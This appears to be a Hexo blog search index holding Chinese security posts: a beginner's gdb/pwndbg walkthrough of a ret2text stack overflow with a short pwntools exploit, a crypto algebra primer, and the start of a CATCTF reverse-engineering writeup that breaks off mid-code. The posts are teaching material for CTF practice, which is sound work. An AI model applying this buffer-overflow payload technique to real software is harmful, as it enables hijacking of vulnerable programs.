<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>初学者视角：我是如何一步步调试理解ret2text的</title>
      <link href="/2025/09/20/pwndbg-ret2sth/"/>
      <url>/2025/09/20/pwndbg-ret2sth/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-基础指令"><a href="#0x01-基础指令" class="headerlink" title="0x01.基础指令"></a>0x01.基础指令</h1><p>详见：<a href="https://zz-zz-955.github.io/hugo-dev/p/gdb%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E4%BD%BF%E7%94%A8pwndbg%E6%8F%92%E4%BB%B6/">https://zz-zz-955.github.io/hugo-dev/p/gdb%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E4%BD%BF%E7%94%A8pwndbg%E6%8F%92%E4%BB%B6/</a></p><h1 id="0x02-使用gdb调试ret2text"><a href="#0x02-使用gdb调试ret2text" class="headerlink" title="0x02.使用gdb调试ret2text"></a>0x02.使用gdb调试ret2text</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file vuln</span><br><span class="line">vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=321b931a0d7856bf5bba57b9ceb0c0fcc1ed737b, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><p>看到是32位可执行文件，用IDA进行静态调试。</p><p>在伪代码中查看<code>vuln</code>函数内容。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从中得知漏洞由<code>gets</code>函数触发，现在我们进<code>gdb</code>中进行调试。</p><h3 id="反汇编-vulnerable-函数，看看它的结构。"><a href="#反汇编-vulnerable-函数，看看它的结构。" class="headerlink" title="反汇编 vulnerable 函数，看看它的结构。"></a>反汇编 vulnerable 函数，看看它的结构。</h3><p><img src="/./images/pwndbg-ret2sth/ret2text-disasm-vuln-func.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x0804920d &lt;+43&gt;:    call   0x8049060 &lt;gets@plt&gt; <span class="comment"># 漏洞点</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x08049209 &lt;+39&gt;:    lea    eax,[ebp-0x48] <span class="comment"># 这一段就是偏移量，0x48换成Dec就是72,之后加上</span></span><br></pre></td></tr></table></figure><p>我们根据上述信息大致画出这样的一个图来表示栈空间情况</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|    调用者的栈帧...     |</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+ &lt;--- 调用前的 ESP</span><br><span class="line">|    返回地址 (EIP)      |  // 由 call vuln 压入 (目标!)</span><br><span class="line">+-----------------------+ &lt;--- 进入 vuln 后的 ESP</span><br><span class="line">|      保存的 EBP        |  // push ebp (vuln+0) ← 这里就是当前EBP指向的位置</span><br><span class="line">+-----------------------+ &lt;--- EBP 指向这里 (vuln+1)</span><br><span class="line">|      保存的 EBX        |  // push ebx (vuln+4)</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|   分配的空间 (0x44)    |  // sub esp, 0x44</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+ &lt;--- 当前的 ESP</span><br><span class="line">|                       |</span><br><span class="line">|      buf[72字节]       |  // [ebp - 0x48]  ← 你的数据从这里开始写入</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+ &lt;--- EBP - 0x48</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure><h3 id="启动调试并设置关键断点"><a href="#启动调试并设置关键断点" class="headerlink" title="启动调试并设置关键断点"></a>启动调试并设置关键断点</h3><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在`vuln`入口处下断点</span></span><br><span class="line"><span class="keyword">b </span>vuln</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在`gets`调用前下断点</span></span><br><span class="line"><span class="keyword">b </span>*<span class="number">0x0804920d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在`gets`返回后下断点</span></span><br><span class="line"><span class="keyword">b </span>*<span class="number">0x08049212</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 ret 指令前下断点</span></span><br><span class="line"><span class="keyword">b </span>*<span class="number">0x0804922c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行程序</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="观察进入函数时的栈帧（在-vuln-断点处）"><a href="#观察进入函数时的栈帧（在-vuln-断点处）" class="headerlink" title="观察进入函数时的栈帧（在 vuln 断点处）"></a>观察进入函数时的栈帧（在 vuln 断点处）</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看寄存器</span></span><br><span class="line"><span class="attribute">i</span> r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录关键地址</span></span><br><span class="line">p <span class="variable">$ebp</span></span><br><span class="line">p <span class="variable">$esp</span></span><br></pre></td></tr></table></figure><p><img src="/./images/pwndbg-ret2sth/ret2text-stack.png"></p><p><img src="/./images/pwndbg-ret2sth/ret2text-stack-2.png"></p><p>此时栈帧状态：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">|    返回地址 (EIP)      |  ← ESP指向这里</span><br><span class="line">+-----------------------+</span><br><span class="line">|      保存的 EBP        | </span><br><span class="line">+-----------------------+</span><br><span class="line">|      保存的 EBX        |</span><br><span class="line">+-----------------------+</span><br><span class="line">|         ...           |</span><br></pre></td></tr></table></figure><h3 id="观察调用-gets-前的栈帧（在-call-gets-断点处）"><a href="#观察调用-gets-前的栈帧（在-call-gets-断点处）" class="headerlink" title="观察调用 gets 前的栈帧（在 call gets 断点处）"></a>观察调用 gets 前的栈帧（在 <code>call gets</code> 断点处）</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 继续执行</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"># 再次查看栈帧</span><br><span class="line">stack 20</span><br><span class="line"></span><br><span class="line"># 查看 buf 的地址</span><br><span class="line">p $ebp - 0x48</span><br></pre></td></tr></table></figure><p><img src="/./images/pwndbg-ret2sth/ret2text-stack-3.png"></p><p>从中我们看到：</p><ul><li>ESP 指向 gets 的参数（buf的地址）</li><li>EBP 保持不变</li><li>栈上已经分配了局部变量空间</li></ul><h3 id="单步执行并输入测试数据"><a href="#单步执行并输入测试数据" class="headerlink" title="单步执行并输入测试数据"></a>单步执行并输入测试数据</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; ni</span><br><span class="line">Breakpoint 3, 0x08049212 <span class="keyword">in</span> vuln ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────</span><br><span class="line"> EAX  0xffffd000 ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line"> EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf14 (_DYNAMIC) ◂— 1</span><br><span class="line">*ECX  0xf7faa9c0 (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  1</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line"> EBP  0xffffd048 ◂— <span class="string">&#x27;saaataaa&#x27;</span></span><br><span class="line"> ESP  0xffffcff0 —▸ 0xffffd000 ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">*EIP  0x8049212 (vuln+48) ◂— add esp, 0x10</span><br><span class="line">───────────────────────────────────────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]───────────────────────────────────────────────────────</span><br><span class="line">   0x8049203 &lt;vuln+33&gt;    add    esp, 0x10</span><br><span class="line">   0x8049206 &lt;vuln+36&gt;    sub    esp, 0xc</span><br><span class="line">   0x8049209 &lt;vuln+39&gt;    lea    eax, [ebp - 0x48]</span><br><span class="line">   0x804920c &lt;vuln+42&gt;    push   eax</span><br><span class="line">b+ 0x804920d &lt;vuln+43&gt;    call   gets@plt                    &lt;gets@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► 0x8049212 &lt;vuln+48&gt;    add    esp, 0x10               ESP =&gt; 0xffffd000 (0xffffcff0 + 0x10)</span><br><span class="line">   0x8049215 &lt;vuln+51&gt;    sub    esp, 0xc                ESP =&gt; 0xffffcff4 (0xffffd000 - 0xc)</span><br><span class="line">   0x8049218 &lt;vuln+54&gt;    lea    eax, [ebx - 0x1fb0]     EAX =&gt; 0x804a050 ◂— <span class="string">&#x27;Maybe I will tell you next time !&#x27;</span></span><br><span class="line">   0x804921e &lt;vuln+60&gt;    push   eax</span><br><span class="line">   0x804921f &lt;vuln+61&gt;    call   <span class="built_in">printf</span>@plt                  &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x8049224 &lt;vuln+66&gt;    add    esp, 0x10</span><br><span class="line">───────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffcff0 —▸ 0xffffd000 ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">01:0004│-054 0xffffcff4 ◂— 0x20 /* <span class="string">&#x27; &#x27;</span> */</span><br><span class="line">02:0008│-050 0xffffcff8 ◂— 0</span><br><span class="line">03:000c│-04c 0xffffcffc —▸ 0x80491ee (vuln+12) ◂— add ebx, 0x2e12</span><br><span class="line">04:0010│ eax 0xffffd000 ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">05:0014│-044 0xffffd004 ◂— <span class="string">&#x27;baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">06:0018│-040 0xffffd008 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">07:001c│-03c 0xffffd00c ◂— <span class="string">&#x27;daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">─────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0 0x8049212 vuln+48</span><br><span class="line">   1 0x61616174 None</span><br><span class="line">   2 0xffffd200 None</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x0804922c <span class="keyword">in</span> vuln ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────</span><br><span class="line">*EAX  0x21</span><br><span class="line">*EBX  0x61616172 (<span class="string">&#x27;raaa&#x27;</span>)</span><br><span class="line">*ECX  0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">*EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">*EBP  0x61616173 (<span class="string">&#x27;saaa&#x27;</span>)</span><br><span class="line">*ESP  0xffffd04c ◂— <span class="string">&#x27;taaa&#x27;</span></span><br><span class="line">*EIP  0x804922c (vuln+74) ◂— ret</span><br><span class="line">───────────────────────────────────────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]───────────────────────────────────────────────────────</span><br><span class="line"> ► 0x804922c &lt;vuln+74&gt;    ret                                &lt;0x61616174&gt;</span><br><span class="line">    ↓</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffd04c ◂— <span class="string">&#x27;taaa&#x27;</span></span><br><span class="line">01:0004│     0xffffd050 —▸ 0xffffd200 ◂— 0x3e8</span><br><span class="line">02:0008│     0xffffd054 ◂— 0x70 /* <span class="string">&#x27;p&#x27;</span> */</span><br><span class="line">03:000c│     0xffffd058 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">04:0010│     0xffffd05c —▸ 0xf7da0519 (__libc_start_call_main+121) ◂— add esp, 0x10</span><br><span class="line">05:0014│     0xffffd060 ◂— 1</span><br><span class="line">06:0018│     0xffffd064 —▸ 0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">07:001c│     0xffffd068 —▸ 0xffffd11c —▸ 0xffffd2c4 ◂— <span class="string">&#x27;HOSTTYPE=x86_64&#x27;</span></span><br><span class="line">─────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0 0x804922c vuln+74</span><br><span class="line">   1 0x61616174 None</span><br><span class="line">   2 0xffffd200 None</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; stack 30</span><br><span class="line">Warning: Avoided exploring possible address 0xffccab8b.</span><br><span class="line">You can explicitly explore it with `vmmap-explore 0xffcca000`</span><br><span class="line">00:0000│ esp 0xffffd04c ◂— <span class="string">&#x27;taaa&#x27;</span></span><br><span class="line">01:0004│     0xffffd050 —▸ 0xffffd200 ◂— 0x3e8</span><br><span class="line">02:0008│     0xffffd054 ◂— 0x70 /* <span class="string">&#x27;p&#x27;</span> */</span><br><span class="line">03:000c│     0xffffd058 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">04:0010│     0xffffd05c —▸ 0xf7da0519 (__libc_start_call_main+121) ◂— add esp, 0x10</span><br><span class="line">05:0014│     0xffffd060 ◂— 1</span><br><span class="line">06:0018│     0xffffd064 —▸ 0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">07:001c│     0xffffd068 —▸ 0xffffd11c —▸ 0xffffd2c4 ◂— <span class="string">&#x27;HOSTTYPE=x86_64&#x27;</span></span><br><span class="line">08:0020│     0xffffd06c —▸ 0xffffd080 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">09:0024│     0xffffd070 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">0a:0028│     0xffffd074 —▸ 0x804922d (main) ◂— push ebp</span><br><span class="line">0b:002c│     0xffffd078 ◂— 1</span><br><span class="line">0c:0030│     0xffffd07c —▸ 0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">0d:0034│     0xffffd080 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">0e:0038│     0xffffd084 —▸ 0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">0f:003c│     0xffffd088 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line">10:0040│     0xffffd08c —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">11:0044│     0xffffd090 ◂— 0x8067c5be</span><br><span class="line">12:0048│     0xffffd094 ◂— 0xcbceafae</span><br><span class="line">13:004c│     0xffffd098 ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">16:0058│     0xffffd0a4 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line">17:005c│     0xffffd0a8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">18:0060│     0xffffd0ac ◂— 0x8b8b0700</span><br><span class="line">19:0064│     0xffffd0b0 —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">1a:0068│     0xffffd0b4 —▸ 0xf7da04a6 (__libc_start_call_main+6) ◂— add ebx, 0x208b5a</span><br><span class="line">1b:006c│     0xffffd0b8 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">1c:0070│     0xffffd0bc —▸ 0xf7da05f3 (__libc_start_main+147) —▸ 0xffccab8b ◂— 0xffccab8b</span><br><span class="line">1d:0074│     0xffffd0c0 ◂— 0</span><br></pre></td></tr></table></figure><p>在<code>esp 0xffffd04c ◂— &#39;taaa&#39;</code>中得知返回地址已经被覆盖</p><p>最后计算出偏移量是76<br><img src="/./images/pwndbg-ret2sth/ret2text-offset-pwndbg.png"></p><h3 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a>EXPLOIT</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">pwn_addr = <span class="number">0x080491A6</span>  </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">76</span> + p32(pwn_addr)  <span class="comment"># 68字节填充 + pwn()地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto基础数学知识</title>
      <link href="/2025/08/28/crypto-basic-math-knowledge/"/>
      <url>/2025/08/28/crypto-basic-math-knowledge/</url>
      
        <content type="html"><![CDATA[<h1 id="代数系统和近世代数"><a href="#代数系统和近世代数" class="headerlink" title="代数系统和近世代数"></a>代数系统和近世代数</h1><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>一个集合中，如果有一种或多种<strong>代数运算</strong> (Algebraic Operation)，则称该集合为<strong>代数系统</strong> (Algebraic System)，也称作<strong>代数结构</strong> (Algebraic Structure)</p><p>代数学作为一个不断进步与完善的数学分支，其研究范围也从古典的整数、有理数、实数与复数等常见数集扩展到了矢量、矩阵和线性算子等对象，这类课题就共同组成了如今的<strong>近世代数</strong> (Modern Algebra)</p><p>上文提到的代数运算，是定义在集合中的元素之间的法则，亦与集合是否能<strong>作成</strong>代数系统有着密切关联，它们扩展自常见的加减乘除这样的运算。经过定义合适的代数运算，集合可以作成群、环、域、格等代数系统</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul><li>$∅$：空集</li><li>$∀$：所有（每一个），强调普遍性</li><li>$∃$：存在（至少一个）</li><li>$∈$：属于</li><li>$e$：群的单位元（群中那个与任何元素运算后都“保持该元素不变”的独一无二的元素）</li><li>$∘$：二元代数运算</li><li>$ψ$：连接两个群（G 和 H）的那个特定映射（函数），在本文中无深意无需纠结</li></ul><h3 id="群"><a href="#群" class="headerlink" title="群"></a>群</h3><p>给定一个集合 $G≠∅$ 以及其上的二元代数运算$「 ∘ 」$，如若它们满足如下性质：</p><ol><li>封闭性（Closure）：∀v,u∈G,v∘u∈G;</li><li>结合律（Associativity）： ∀v,u,w∈G,(v∘u)∘w&#x3D;v∘(u∘w);</li><li>单位元（Identity）： ∃e∈G,∀v∈G,e∘v&#x3D;v;</li><li>逆元（Inverse，亦称反元）： ∀v∈G,∃v−1∈G,v−1∘v&#x3D;e;</li></ol><p>则称集合 G 对该代数运算作成一个<strong>群</strong>（Group），记作 (G,∘).</p><h4 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h4><p>整数加法群 (Z,+) ，不难验证其不仅对加法封闭，满足结合律，且存在整数0作为单位元，并对于每个整数m皆有其相反数−m作为其逆元</p><p>整数乘法群 (Q+,×) ，其中单位元为1，对于每个元素<code>a</code>其逆元为<code>1/a</code>  ，举一个更简单扽例子：定义在集合 {−1,1} 上的乘法群 ({−1,1},×)，这亦不难验证其作成一个群。</p><p>实数域 $R$ 上的全体 $m$ 阶可逆矩阵对于矩阵乘法作成群（单位元为 m 阶单位矩阵 $E_m$，对于每个元素 $A$ 其逆元为它的逆矩阵 $A^−1$），这在近世代数中被称为 $m$ 阶一般线性群 $GL_m(R)$.</p><p>在近世代数中，研究群的分支被称为<strong>群论</strong>（Group Theory）</p><h3 id="半群和幺半群"><a href="#半群和幺半群" class="headerlink" title="半群和幺半群"></a>半群和幺半群</h3><p>在近世代数中，有些代数系统具有环的部分性质，虽不在我们的主要讨论范围内，但它们也具有广泛的应用场景与不可忽视的研究价值：</p><p>对于其上二元代数运算封闭的非空集合，</p><ul><li>如若仅满足结合律，那么可以称该集合对该代数运算作成<strong>半群</strong>（Semigroup）</li><li>如若集合对于代数运算除封闭外，满足结合律，且具有单位元，则可以称其对该运算作成<strong>幺半群</strong>（Monoid）</li></ul><p>由此，我们可以认为：</p><ul><li>幺半群是含有单位元的半群</li><li>群是每个元素皆有逆元的幺半群</li></ul><p>举例来说，正整数对于整数加法作成半群，而非负整数对于整数加法作成幺半群，由于零可以视为整数加法的单位元</p><h3 id="交换群"><a href="#交换群" class="headerlink" title="交换群"></a>交换群</h3><p>给定一个群 (G,∘)，如若其满足交换律（Commutativity） i.e. $∀v,u∈G,  v \circ u &#x3D; u \circ v$ ，则称这个群是一个<strong>交换群</strong>或 Abel（阿贝尔）群（Abelian Group）</p><p>得出：上文提到的举例中，整数加法群 $(Z,+)$ 是交换群，但 $m$ 阶一般线性群 $GL_m(R)$ 不是交换群</p><h3 id="环和域"><a href="#环和域" class="headerlink" title="环和域"></a>环和域</h3><p>给定一个集合 $R≠∅$ 以及其上的两个二元代数运算「 + 」和「 ∘ 」，如若它们满足如下性质：</p><ol><li>$(R,+)$ 作成交换群；</li><li>R 对运算「 ∘ 」满足结合律： $∀v,u,w∈R$, 皆有 $(v∘w)∘u&#x3D;v∘(w∘u)$;</li><li>分配律（Distributivity）： $∀v,u,w∈R$, 皆有 $w∘(v+u)&#x3D;w∘v+w∘u$ 与 $(v+u)∘w&#x3D;v∘w+u∘w$ 成立；</li></ol><p>则称集合 $R$ 对此二代数运算作成一个<strong>环</strong>（Ring），记作 $(R,+,∘)$，并常分别称运算「+」和「∘」为加法和乘法。</p><ul><li>如若环 $R$ 上的乘法存在单位元 i.e. $∃e∈G,∀v∈G$, 皆有 $e∘v&#x3D;v$, 则称环 $R$ 为<strong>幺环</strong>（Ring with identity）；</li><li>如若环 $R$ 上的乘法满足交换律，则称其为<strong>交换环</strong>（Commutative Ring）；</li><li>如若环 $R$ 中对除加法单位元外任意元素 $a≠0$ 皆存在乘法逆元 $a−1$，则称 $R$ 为<strong>除环</strong>（Division Ring）；</li><li>如若环 $R$ 既是交换环又是除环，那么环 $R$ 是一个<strong>域</strong>（Field）。</li></ul><h3 id="阶"><a href="#阶" class="headerlink" title="阶"></a>阶</h3><p>指数：定义群中元素的指数，对于 $v∈G,m$ 为正整数，</p><ul><li>$v^0&#x3D;e$;</li><li>$v^m&#x3D;v∘v∘⋯∘v$, 其中共有 $m$ 个 $v$ 参与代数运算；</li><li>$v^−m&#x3D;(v^−1)^m$;</li></ul><p>元素的阶：对于任意给定的元素 $v∈G$, 如若正整数 $m$ 满足 $v^m&#x3D;e, 则称元素 $v$ 的阶数为 $m$. 如若这样的正整数不存在，则称该元素的阶为无限。</p><p>举例而言，在群 ({1,−1,+j,−j},×) 中，各元素的阶如下：</p><table><thead><tr><th align="center">元素</th><th align="center">阶</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">-1</td><td align="center">2</td></tr><tr><td align="center">+j</td><td align="center">4</td></tr><tr><td align="center">−j</td><td align="center">4</td></tr></tbody></table><h3 id="同态"><a href="#同态" class="headerlink" title="同态"></a>同态</h3><p>代数系统间的<strong>同态</strong>（Homomorphism）指在不同代数系统间能够保持代数运算的映射。</p><p>具体来讲，对于群 $(G,∘)$ 和 $(H,∗)$ 而言，如若一个映射 $ψ:G→H$ 满足 $∀v,u∈G$,</p><p>$ψ(v∘u)&#x3D;ψ(v)∗ψ(u)$,</p><p>那么映射 $ψ$ 便可以称为从 $G$ 到 $H$ 的一个<strong>群同态</strong>。</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li>杨子胥，《近世代数》（第四版），高等教育出版社</li><li><a href="https://oi-wiki.org/math/group-theory/">群论简介 - OI-Wiki</a></li><li><a href="https://ctf-wiki.org/crypto/basic/introduction/">基础数学知识 - CTF-Wiki</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CATCTF-Reverse-CatFly Writeup</title>
      <link href="/2025/08/26/CATCTF-RE-CatFly/"/>
      <url>/2025/08/26/CATCTF-RE-CatFly/</url>
      
        <content type="html"><![CDATA[<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>查看文件类型</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/CTF_Challenges/Reverse/CatFly$ file CatFly </span><br><span class="line">CatFly: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d05baf98f7d937f503c87ced28e78998e8d3046b, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure><p>main函数IDA伪代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  _WORD v5[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-4B0h] BYREF</span></span><br><span class="line">  <span class="type">time_t</span> time1; <span class="comment">// [rsp+18h] [rbp-4A8h] BYREF</span></span><br><span class="line">  <span class="type">time_t</span> timer; <span class="comment">// [rsp+20h] [rbp-4A0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> longind; <span class="comment">// [rsp+2Ch] [rbp-494h] BYREF</span></span><br><span class="line">  _QWORD s[<span class="number">129</span>]; <span class="comment">// [rsp+30h] [rbp-490h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+43Ch] [rbp-84h]</span></span><br><span class="line">  <span class="type">double</span> v11; <span class="comment">// [rsp+440h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// [rsp+448h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+450h] [rbp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [rsp+454h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+45Ah] [rbp-66h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+45Bh] [rbp-65h]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+45Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+460h] [rbp-60h]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [rsp+467h] [rbp-59h]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+468h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+46Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> v22; 